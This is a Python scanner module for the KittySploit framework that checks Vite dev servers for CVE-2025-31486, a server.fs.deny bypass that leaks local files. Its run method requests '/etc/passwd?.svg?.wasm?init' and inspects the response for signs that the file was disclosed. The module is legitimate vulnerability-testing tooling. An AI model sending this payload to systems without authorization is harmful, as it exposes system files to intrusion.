#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vite is a frontend tooling framework for javascript."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vite server.fs.deny Bypass - Local File Inclusion Detection',
        'description': 'Vite is a frontend tooling framework for javascript. The contents of arbitrary files can be returned to the browser. By adding ?.svg with ?.wasm?init or with sec-fetch-dest- script header, the server.fs.deny restriction was able to bypass. This bypass is only possible if the file is smaller than build.assetsInlineLimit (default- 4kB) and when using Vite 6.0+. Only apps explicitly exposing the Vite dev server to the network (using --host or server.host config option) are affected.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'vite', 'lfi'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-xcj6-pq6g-qj4x',
            'https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290',
            'https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647',
            'https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-31486',
        ],
        'cve': 'CVE-2025-31486',
    }

    def run(self):
        path = '/etc/passwd?.svg?.wasm?init'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_any = ('/@fs/etc/passwd?.svg',)
        body_all = ('import initWasm', 'sourceMappingURL=',)
        ctype_any = ('text/javascript',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Vite server.fs.deny Bypass - Local File Inclusion detected',
                path=path,
            )
            return True
        return False

